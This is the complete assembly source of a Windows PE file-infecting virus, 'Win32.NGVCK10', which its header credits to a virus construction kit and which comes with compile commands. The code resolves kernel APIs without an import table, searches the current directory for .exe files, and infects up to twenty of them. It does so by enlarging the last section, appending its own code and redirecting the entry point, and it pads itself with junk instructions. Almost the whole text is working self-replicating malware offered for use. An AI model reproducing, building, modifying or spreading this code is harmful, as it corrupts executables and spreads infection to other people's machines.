              
;
;
; Win32.NGVCK10 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK10
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 28
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, ( -1d - 26d )
 add edx, 26d
 and edx, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], edx

                                        ; mov eax, -1
 mov eax, ( -1d + 29d )
 sub eax, 29d
 and eax, dword ptr [ebp+OldBase]

 push eax
 pop dword ptr [ebp+retBase]

                                        ; clear esi
 mov esi, 2395d
 sub esi, 2395d
 xor esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+Trash1], edx        ; Trash
 and dword ptr [ebp+retEIP], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 sub ecx, 30249063d                     ; Trash
 mov edx, ebp
 add edx, offset filemask

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 cmp ecx, 0
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;                  [ ///// * Data * \\\\\ ]

Data:
 NewEIP      dd 0h
 AlignReg2   dd 0h
 KernelMZ    dd 0h
 OTableVA    dd 0h
 filemask    db '*.exE',0

 APINames:
 db 'FindFirstFileA', 0
 db 'FindClose', 0
 db 'GetFileAttributesA', 0
 db 'FindNextFileA', 0
 db 'MapViewOfFile', 0
 db 'UnmapViewOfFile', 0
 db 'CloseHandle', 0
 db 'CreateFileMappingA', 0
 db 'CreateFileA', 0
 db 'SetFileAttributesA', 0

 MapHandle   dd 0h
 NewSize     dd 0h
 OldBase     dd 400000h
 counter     dw 0h
 TempAPI     dd 0h
 NTableVA    dd 0h
 Trash2      dd 0h
 InfCounter  dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XSetFileAttributesA    dd 0h

 Attributes  dd 0h
 OldEIP      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FindHandle  dd 0h
 db 'Win32.NGVCK10 created by SnakeByte',0
 KernelPE    dd 0h
 TempApisearch1 dd 0h
 FileHandle  dd 0h
 Trash1      dd 0h
 ATableVA    dd 0h
 MapAddress  dd 0h
 AlignReg1   dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ebx

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop edx
 push edx
 push 0
 push edx
 push 0
                                        ; mov ecx, 4
 mov ecx, ( 4d + 3d )
 sub ecx, 3d
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop edx
 dec eax
 inc eax
 jz CloseFile
 push edx
 push 0
 push 0
                                        ; mov eax, 2
 mov eax, ( 2d - 13d )
 add eax, 13d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 mov dword ptr [ebp+Trash1], ecx        ; Trash
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 push edx
 pop dword ptr [ebp+retEIP]

 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], -1
 and dword ptr [ebp+Trash2], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 sub ebp, 1
 add ebp, 1
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 jmp edx



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
 push esi
                                        ; round to pages
 shr esi, 16d
 shl esi, 16d
                                        ; add esi, 1
 add esi, 1d
GetKernelLoop:
                                        ; clear ebx
 mov ebx, -67186d
 add ebx, 67186d
 dec esi
 and dword ptr [ebp+Trash1], 1833479    ; Trash
 mov bx, word ptr [esi+03ch]
 cmp bx,0f800h
 je GetKernelLoop
 cmp esi, dword ptr [esi+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], esi
                                        ; add esi, 60
 add esi, 60d
 mov eax, [esi]
 add esi, -60d
 add eax, esi
 mov [KernelPE+ebp], eax
 mov edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 sub ebx, ebx
 add ebx, [edx+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+Trash1], 1145263    ; Trash
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 mov dword ptr [ebp+NTableVA], edx
                                        ; get OTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 lea ebx, GetApis
 add ebx, ebp

 push ebx
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear eax
 sub eax, eax
 add eax, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APIOffsets]

 lea ebx, [ebp+APINames]
 xchg esi, ebx
 or edx, 4294195d                       ; Trash


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 push esi
 pop edx
APINameDetect:                          ; calculate the lenght of the names
 add edx, 1d
 cmp byte ptr [edx], 0
 jne APINameDetect

 push edx
 sub dword ptr [esp], esi
 pop edx
                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; esi points to the Name
                                        ; ecx points to the offset

 call SearchAPI1
                                        ; add esi, 1
 sub esi, -1d
 push esi
 add dword ptr [esp], edx
 pop esi
 push dword ptr [ebp+TempAPI]
 adc dword ptr [ebp+Trash1], edx        ; Trash
 pop ebx
 mov dword ptr [ecx], ebx
                                        ; add ecx, 4
 add ecx, 4d
 dec eax
 jnz GetApisLoop
 lea edi, [ebp+Outbreak]
 xchg ecx, edi

 push ecx
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, -8617d
 add edx, 8617d
 mov eax, dword ptr [ebp+AlignReg1]
 not ecx                                ; Trash
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [ecx]
                                        ; mov ecx, ebx
 push ebx
 pop ecx
                                        ; mov edi, ecx
 mov edi, ecx
 mov dword ptr [ebp+TempApisearch1], edx
 push edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [edi]
 sbb ebx, 18d                           ; Trash
 cmp ah, byte ptr [esi]
 jne ApiNotFound
 dec edx
 or edx, edx
 jz FoundApi1
                                        ; add edi, 1
 sub edi, -1d
                                        ; add esi, 1
 inc esi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop edi
 add dword ptr [ebp+Trash1], edx        ; Trash
 pop ecx
                                        ; mov edx, -1
 push -1d
 pop edx
 and edx, dword ptr [ebp+TempApisearch1]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 xchg ebx, eax
 movzx ebx, word ptr [eax]
 clc
 rcl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], 0
 sbb eax, 14d                           ; Trash
 add dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, 128d
 push eax
 lea ebx, [ebp+WFD_szFileName]


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 inc eax
 dec eax
 jz NoInfection
                                        ; check for minimum filesize
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ebx, word ptr [edi]
 sub ebx, 'ZM'
 jz Goodfile
                                        ; clear ebx
 and ebx, 0
                                        ; add ebx, 1
 add ebx, 1d
 sub ebx, 1
 jz Notagoodfile

Goodfile:
 cmp word ptr [edi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov ebx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jnz yNotagoodfile
 sub edx, eax                           ; Trash
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [ebx+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 adc dword ptr [ebp+Trash1], ecx        ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 add edx, ecx                           ; Trash
                                        ; restore the file attributes
 push dword ptr [ebp+Attributes]
 pop eax
 push eax
 lea eax, [ebp+WFD_szFileName]
 xchg edx, eax

 push edx
 ror eax, 14d                           ; Trash
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, ecx

 push ecx
 push dword ptr [ebp+FindHandle]
 or ebx, edx                            ; Trash
 pop edx
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ecx, esi

 push esi
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d + 21d )
 sub ebx, 21d
 lea eax, [ebp+WFD_szFileName]
 xchg edx, eax


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ebx
 mov ebx, 63485d
 sub ebx, 63485d
 add ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, ebx
 add eax, [ebx+3Ch]
                                        ; get File Alignment
 mov ebx, [eax+3Ch]
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add edx, VirusSize
 xor dword ptr [ebp+Trash1], eax        ; Trash
 push edx
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ebx
 call Align
                                        ; mov edx, -1
 mov edx, ( -1d - 6d )
 add edx, 6d
 and edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 mov ecx, 87750917d                     ; Trash
 pushad
 Call UnMapFile2
 popad
 push edx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
                                        ; mov esi, -1
 push -1d
 pop esi
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, esi
 add edi, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, 0
 add esi, edi
                                        ; get last section
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [esi+06h]
 sub ecx, 1
 imul ecx, ecx, 28h
 add edi, ecx
                                        ; add edi, 120
 add edi, 120d
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [esi+74h]
 shl eax, 3
 add edi, eax
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], edx
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ebx
                                        ; clear eax
 mov eax, 27504d
 sub eax, 27504d

 add eax, [edi+10h]
                                        ; mov ecx, eax
 mov ecx, eax
 add edi, 14h
 neg edx                                ; Trash
 add eax, [edi]
 sub edi, 14h
 push eax
 push ecx
 pop ebx
 add ebx, [edi+0Ch]
 push ebx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
                                        ; clear ebx
 xor ebx, ebx

 add ebx, [edi+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add ebx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ebx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
 mov dword ptr [edi+10h], 0h
 or edx, ebx                            ; Trash
 add dword ptr [edi+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [edi+08h], ebx
 mov ebx, dword ptr [edi+0Ch]
 add ebx, dword ptr [edi+10h]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [edi+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov ebx, VirusSize
 lea edx, [ebp+Virus]
 xchg esi, edx

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], 0
 sbb ebx, 15d                           ; Trash
 xor dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

